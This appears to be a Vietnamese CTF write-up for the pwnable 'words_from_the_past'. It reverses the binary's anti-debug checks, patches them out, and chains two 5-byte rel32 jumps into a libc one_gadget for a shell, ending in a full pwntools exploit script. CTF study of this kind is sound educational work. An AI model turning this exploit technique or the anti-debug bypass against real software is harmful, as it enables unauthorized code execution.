---
pubDatetime: 2026-08-05T12:01:40Z
title: Advent of Pwn CTF 2026 - Day5
slug: "advent_of_pwn_ctf_2025_day5"
featured: true
tags:
  - pwnable
  - advent_of_pwn_ctf
description: "Writeups of the pwnable challenges in Cyber Apocalypse CTF 2026"
---
# Introduce
Đây là một bài shellcode! 
## Enumeration
```bash
$ file ./words_from_the_past
./words_from_the_past: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, BuildID[sha1]=238fd45740ccdda61d7bc7e9b0d7ba0a587b8cbb, for GNU/Linux 3.2.0, stripped
$ checksec --file=words_from_the_past
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   RUNPATH     No Symbols         No    0      2words_from_the_past
$ strings glibc/libc.so.6 | grep GNU
GNU C Library (Ubuntu GLIBC 2.39-0ubuntu8.7) stable release version 2.39.
Compiled by GNU CC version 13.3.0.
```
## Reverse enginering
Mình đã sử dụng MCP IDA PRO để đặt lại các tên hàm, tên biến cho tiện trong quá trình reverse.
### Hàm main
```c
void __fastcall main(int a1, char **a2, char **a3)
{
  unsigned __int8 *mmap_ret; // rax
  char expected_opcode; // [rsp+3Bh] [rbp-3Dh]
  __pid_t child_pid; // [rsp+40h] [rbp-38h]
  void *mmap_addr; // [rsp+48h] [rbp-30h]
  unsigned __int64 libc_base; // [rsp+50h] [rbp-28h]
  unsigned __int8 *shellcode; // [rsp+60h] [rbp-18h]

  puts(asc_2110);
  puts("[Garran Voss] Rin.. You know what to do... Precise moves, keep it fast and lethal..\n");
  fflush(stdout);
  if ( !g_fork_guard )
  {
    g_fork_guard = 1;
    child_pid = fork();
    if ( child_pid )
    {
      waitpid(child_pid, 0, 0);
      _exit(0);
    }
  }
  prctl(4, 0);
  if ( g_stage )
  {
    libc_base = find_libc_base();
    mmap_addr = (void *)(libc_base - (((getpid() & 7) + 4096LL) << 12));
    g_stage = 2;
    expected_opcode = -23;
    mmap_ret = (unsigned __int8 *)mmap(mmap_addr, 0x1000u, 7, 50, -1, 0);
  }
  else
  {
    g_stage = 1;
    expected_opcode = -24;
    mmap_ret = (unsigned __int8 *)mmap((char *)main + 0x10000, 0x1000u, 7, 34, -1, 0);
  }
  shellcode = mmap_ret;
  if ( mmap_ret == (unsigned __int8 *)-1LL )
  {
    puts("mmap failed!");
    exit(1);
  }
  if ( (int)read(0, mmap_ret, 5u) <= 4 )
    exit(1);
  anti_debug_checks();
  check_no_null_newline((__int64)shellcode);
  check_no_int3((__int64)shellcode);
  check_first_opcode(shellcode, expected_opcode);
  timing_check();
  puts("[Garran Voss] Rin.. You know what to do... Precise moves, keep it fast and lethal..\n");
  fflush(stdout);
  __asm { jmp     rdx }
}
```
Giải thích:
+ Chương trình in ra chuỗi như những gì chúng ta đã thấy khi chạy chương trình, rồi nó gọi 1 lệnh `fork()` duy nhất trong chương trình được check bởi biến `g_fork_guard` => Đoạn sau chương trình hoạt động trong tiến trình con. Giờ chương trình cha chỉ chờ chương trình con chạy xong rồi `exit`.
+ Điều kiện if được check bởi biến `g_stage`. Lúc đầu thì giá trị mặc định của biến sẽ bằng 0 nên nó sẽ nhảy vào nhánh else thực hiện lệnh `mmap_ret = (unsigned __int8 *)mmap((char *)main + 0x10000, 0x1000u, 7, 34, -1, 0);`
+ Chương trình yêu cầu người dùng nhập vào đúng 5 bytes. 
+ Các hàm tiếp theo chủ yếu dùng để check các điều kiện như tên đã đặt. Lưu ý ở hàm `check_first_opcode` bắt buộc byte đầu tiên phải có giá trị đúng như biến `expected_opcode`.

+ Nhìn vào ảnh trên thì biến `rdx` được gán cho `[rbp+buf]`, và biến `[rbp+buf]` lại là tham số được truyền vào cho hàm `check_no_null_newline` tương đương với `check_no_null_newline(shellcode)` => `jmp rdx` sẽ nhảy đến shellcode.


### Hàm anti_debug_checks
```c
unsigned __int64 anti_debug_checks()
{
  int dummy_counter; // [rsp+Ch] [rbp-134h]
  int loop_idx; // [rsp+10h] [rbp-130h]
  FILE *status_file; // [rsp+18h] [rbp-128h]
  unsigned __int64 tsc_start; // [rsp+20h] [rbp-120h]
  char line[10]; // [rsp+30h] [rbp-110h] BYREF
  char tracer_pid_str[254]; // [rsp+3Ah] [rbp-106h] BYREF
  unsigned __int64 canary; // [rsp+138h] [rbp-8h]

  canary = __readfsqword(0x28u);
  if ( getenv("LD_PRELOAD") || getenv("LD_AUDIT") )
  {
    puts("Preload detected!");
    exit(1);
  }
  status_file = fopen("/proc/self/status", "r");
  if ( status_file )
  {
    while ( fgets(line, 256, status_file) )
    {
      if ( !strncmp(line, "TracerPid:", 0xAu) )
      {
        if ( atoi(tracer_pid_str) )
        {
          puts("Debugger detected!");
          exit(1);
        }
        break;
      }
    }
    fclose(status_file);
  }
  tsc_start = rdtsc_now();
  dummy_counter = 0;
  for ( loop_idx = 0; loop_idx <= 49999; ++loop_idx )
    ++dummy_counter;
  if ( rdtsc_now() - tsc_start > 0x1DCD6500 )
  {
    puts("Timing anomaly detected!");
    exit(1);
  }
  return canary - __readfsqword(0x28u);
}
```
Giải thích:

Hàm này được gọi ngay sau khi chương trình đọc 5 byte shellcode và trước khi `jmp rdx`, gồm 3 lớp kiểm tra độc lập:

+ **Kiểm tra biến môi trường**: `getenv("LD_PRELOAD")` và `getenv("LD_AUDIT")`[^ld_preload] — đây là hai biến môi trường thường được dùng để nạp thư viện tuỳ ý vào tiến trình (kỹ thuật hay dùng để hook hàm, patch hành vi, hoặc bypass check khác). Chỉ cần một trong hai được set là chương trình thoát ngay, chặn luôn hướng "sửa hành vi chương trình bằng thư viện ngoài".

+ **Kiểm tra `TracerPid`**: chương trình mở `/proc/self/status`, đọc từng dòng tìm dòng bắt đầu bằng `TracerPid:`. Trường này do kernel ghi lại PID của tiến trình đang `ptrace`[^ptrace] mình — nếu đang bị gdb (hoặc bất kỳ debugger nào dùng ptrace) attach thì giá trị này khác 0. Khi chạy bình thường (không debugger) thì `TracerPid` luôn là 0 nên nhánh này tự pass, không ảnh hưởng tới exploit thật.

+ **Kiểm tra thời gian thực thi (timing check)**: dùng `rdtsc_now()` (đọc thanh ghi TSC — Time Stamp Counter[^tsc], đếm số chu kỳ CPU) lấy mốc thời gian trước và sau một vòng lặp rỗng 50.000 lần (`dummy_counter`). Nếu hiệu số vượt ngưỡng `0x1DCD6500` (~500 triệu chu kỳ) thì bị coi là "Timing anomaly" và thoát. Ý tưởng: chạy dưới debugger (đặc biệt khi có breakpoint/single-step) khiến đoạn code này chạy chậm hơn hẳn so với chạy tự nhiên trên CPU thật, nên đây là một lớp anti-debug không dựa vào `ptrace` mà dựa vào đặc tính thời gian.

[^ld_preload]: `LD_PRELOAD`/`LD_AUDIT` là các biến môi trường của dynamic linker (`ld.so`) trên Linux, cho phép nạp trước 1 shared object tuỳ ý vào tiến trình trước cả libc — đây là kỹ thuật hook hàm rất phổ biến (ví dụ để trace syscall, giả lập `libc` khi debug local, hoặc bypass 1 check nào đó bằng cách override hàm gốc).

[^ptrace]: `ptrace(2)` là syscall nền tảng mà hầu hết debugger trên Linux (gdb, strace...) dùng để attach, đọc/ghi bộ nhớ và điều khiển tiến trình con. Một tiến trình chỉ có thể bị `ptrace` bởi **một** tracer tại một thời điểm, đó cũng là lý do vì sao nhiều bài anti-debug tự `ptrace(PTRACE_TRACEME)` chính mình để "khoá chỗ", ngăn debugger khác attach vào sau.

[^tsc]: Time Stamp Counter là một thanh ghi 64-bit có trên hầu hết CPU x86, tăng dần theo mỗi chu kỳ xung nhịp (hoặc theo tần số cố định với các CPU đời mới hỗ trợ *invariant TSC*). Đọc được qua lệnh `rdtsc`, đây là cách đo thời gian có độ phân giải cực cao thường dùng trong side-channel và các kỹ thuật anti-debug dựa trên thời gian thực thi.

[^one_gadget]: `one_gadget` là công cụ tìm các địa chỉ trong `libc` mà khi nhảy tới, chỉ cần thoả một vài điều kiện về thanh ghi/bộ nhớ là sẽ gọi thẳng được `execve("/bin/sh", NULL, NULL)` — thay vì phải tự dựng ROP chain gọi `system()`/`execve` thủ công. Rất hữu ích khi đã leak được `libc_base` nhưng không gian ghi payload lại quá hạn chế, giống tình huống 5 byte trong bài này.

## Exploitation Stategy
Chương trình yêu cầu chúng ta viết 5 bytes vào shellcode rồi thực thi nó nhưng lại bị ràng buộc bởi các byte đầu bắt buộc là `E8 xx xx xx xx      ; CALL rel32`,`E9 xx xx xx xx      ; JMP  rel32` với mỗi lệnh nmap.

Quy trình RCE:
+ Stage1: Chúng ta viết 5 bytes shellcode để back lại vị trí trước khi thực thi lệnh if else của nmap vì sau khi thực hiện lần đầu, biến `g_stage` giờ đã có giá trị bằng 1. Nếu nhảy vào nhánh if lần nữa thì nó sẽ nmap vùng libc.
+ Stage2: Chúng ta viết tiếp 5 bytes shellcode để nhảy đến vị trị one_gadget để RCE. Phải bruteforce giá trị pid từ [0,7].

### Bypassing anti_debug function
Lúc đầu cách bypass của mình chỉ đơn giản là `set {int}($rbp-0x12c) = 0` trong pwndbg để bypass điều kiện TracerPid nhưng mỗi lần debug thì lại phải nhập câu lệnh đó rất tốn công.
Sau khi end giải mình tham khảo được một writeup của người khác, cách người ta bypass thật đơn giản :)) [Writeup](https://medium.com/@dassomnath/words-from-the-past-binary-exploitation-htb-cyber-apocalypse-2026-6f2e560b3f6f)

Sử dụng một đoạn code python ngắn:
```python
import os
from pwn import *
context.arch = "amd64"

exe = ELF("./words_from_the_past")
anti_debug = 0x1295
exe.asm(anti_debug, "ret")
exe.save("./words_from_the_past_debug")
os.chmod("./words_from_the_past_debug", 0o755)
```

Mình sử dụng file `words_from_the_past_debug` để exploit luôn vì những địa chỉ của các hàm là không thay đổi.
### Debug tiến trình con sau fork() với gdb — thứ tự lệnh quan trọng

Vì toàn bộ phần thú vị (`mmap` / `read` / `jmp rdx`) chỉ chạy trong **tiến trình con** sau
`fork()`, nếu setup gdb sai thứ tự thì breakpoint sẽ không bao giờ được chạm tới, hoặc tệ
hơn là tiến trình cha thoát giữa chừng làm hỏng cả phiên debug. Dưới đây là thứ tự chính
xác cần theo, cùng lý do vì sao mỗi dòng phải nằm đúng vị trí của nó.

```bash
set follow-fork-mode child
set detach-on-fork off
```

**1. `set follow-fork-mode child` — phải đặt trước khi chạy**

Đây là một thiết lập *cấu hình*, chỉ có hiệu lực với các lời gọi `fork()` xảy ra **sau**
khi được đặt. Toàn bộ khối `mmap`/`read`/`jmp rdx` mà mình cần theo dõi nằm trong tiến
trình con sinh ra từ `fork()` tại `0x1721`. Nếu lệnh này chưa được đặt trước khi chương
trình chạy tới `fork()`, gdb sẽ mặc định bám theo tiến trình cha (vốn chỉ gọi `waitpid`
rồi `exit`) — nghĩa là breakpoint tại `jmp rdx` sẽ **không bao giờ** được chạm tới.

Đây cũng chính là lý do nên dùng `gdb.debug()` (khởi động tiến trình từ đầu, dưới quyền
kiểm soát của gdb) thay vì `gdb.attach()` (đính kèm vào tiến trình đang chạy), `attach` thường xảy ra sau khi tiến trình đã fork xong.

**2. `set detach-on-fork off` — giữ lại cả hai tiến trình**

Mặc định GDB có `detach-on-fork on`: khi `fork()` xảy ra, gdb chọn bám theo một tiến trình
(theo `follow-fork-mode` ở trên) và **thả tự do** tiến trình còn lại — tiến trình bị thả sẽ chạy độc lập, không còn nằm dưới sự kiểm soát của debugger. Đặt `off` để gdb giữ quyền
kiểm soát **cả cha lẫn con**, biến chúng thành hai *inferior* riêng biệt trong cùng một
phiên. 
Lợi ích: có thể dùng `info inferiors` để xem và chuyển qua lại giữa cha/con khi cần.

### Bypassing ALSR with REL32

Ràng buộc của bài: chỉ được ghi **5 byte** vào `shellcode`, byte đầu bắt buộc đúng
`expected_opcode` (`0xE8` ở tầng 1, `0xE9` ở tầng 2), 4 byte còn lại không được chứa
`0x00`/`0x0a`/`0xcc`. Vậy 5 byte đó chỉ có thể là **đúng một lệnh nhảy tương đối**:

```asm
E8 xx xx xx xx      ; CALL rel32
E9 xx xx xx xx      ; JMP  rel32
```

CPU thực thi lệnh này bằng cách nhảy tới `địa_chỉ_lệnh_hiện_tại + 5 + rel32` (`+5` vì
`E8`/`E9 rel32` luôn dài đúng 5 byte, `rip` đã trỏ qua hết lệnh trước khi cộng offset). Từ
đó suy ngược:

```
rel32 = target - (địa_chỉ_shellcode + 5)
```

`target` và `địa_chỉ_shellcode` (chính là `mmap_ret`) đều là địa chỉ runtime, tức đều mang
theo độ lệch ASLR. Điểm mấu chốt để không cần leak: nếu cả hai đại lượng này được tính từ
**cùng một base ngẫu nhiên**, base sẽ tự triệt tiêu khi trừ, để lại một `rel32` là **hằng số**.

**Stage1 — nhảy trở về điều kiện if-else:**

Chạy với chế độ NOASLR để dễ debug.

Lệnh nmap này trả về 1 địa chỉ là `0x555555565000`. Như vậy chúng ta đã hình dung được sẽ nhập shellcode vào địa chỉ này. Đích muốn nhảy tới là điểm ngay sau khối `fork()`/`waitpid` — nơi `if (g_stage)` được kiểm tra lại — để buộc `main` "chạy lại với `g_stage` đã đổi, dựng tiếp mmap/read cho tầng 2. Đích này cũng là `base_binary + offset_cố_định`. Vì cả `target` lẫn `mmap_ret` đều `= base_binary + const`, `base_binary`
bị triệt tiêu trong phép trừ:
```
rel32_1 = (base + 0x174d) - (base + 0x11000 + 5)
        = 0x174d - 0x11005
        = 0xFFFF0748          ; little-endian: 48 07 FF FF — không dính byte cấm
```

Vậy là đã thành công nhảy vào đúng target stage1.

**Tầng 2 — nhảy vào one_gadget:**

Sau khi tầng 1 khiến `main` chạy lại với `g_stage = 1`, nhánh `if (g_stage)` gọi
`find_libc_base()` rồi:

```c
mmap_addr = (void *)(libc_base - (((getpid() & 7) + 4096LL) << 12));
```

lần này có `MAP_FIXED` (flags `= 50`) nên trang shellcode chắc chắn nằm đúng tại
`libc_base − ((pid&7 + 0x1000) << 12)` — tức là một khoảng **cố định phía dưới** libc,
chỉ lệch theo 3 bit thấp của PID. Đích lần này là một `one_gadget`[^one_gadget] bên trong libc:
`libc_base + G`. Cả `target` lẫn `mmap_ret` đều mang theo `libc_base`, nên nó cũng triệt
tiêu:

```
rel32_2 = (libc_base + G) - (libc_base - ((pid&7 + 0x1000) << 12) + 5)
        = G + ((pid&7 + 0x1000) << 12) - 5
        = G + 0x1000000 + (pid&7) * 0x1000 - 5
```

Kết quả chỉ còn phụ thuộc **`G`** (offset one_gadget, tra được ngay từ file
`glibc/libc.so.6` đi kèm bài) và **`pid & 7`** — 3 bit thấp của PID tiến trình con, một
đại lượng ta **không biết trước nhưng chỉ có 8 khả năng**.

Đặt breakpoint tại hàm `getpid()` rồi set giá trị trả về (giả sử trường hợp này mình muốn pid = 1) thì `set $rax = 1` và chạy `context` để cập nhật giá trị.


Sau khi set xong pid và mục tiêu là nhảy đến one_gadget có offset (0x583f3)

Nhảy thành công!!!
## Final Exploit

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF('./words_from_the_past_patched', checksec=False)
libc = ELF('./glibc/libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)

gdbscript = '''
set follow-fork-mode child
set detach-on-fork off
brva 0x16D5
# brva 0x1791
# brva 0x18b7
brva 0x179C
c
'''

if args.REMOTE:
    p = remote('')
elif args.GDB:
    p = gdb.debug([exe.path], gdbscript=gdbscript)
else:
    p = process([exe.path])
one_gadget = [0x583ec, 0x583f3, 0xef4ce, 0xef52b]
p.send(b'\xE8' + p32((0x174d - 0x11005) & 0xffffffff))
p.send(b'\xE9' + p32((one_gadget[1] + 0x1000000 + 1 * 0x1000 - 5) & 0xffffffff))
p.interactive()
```


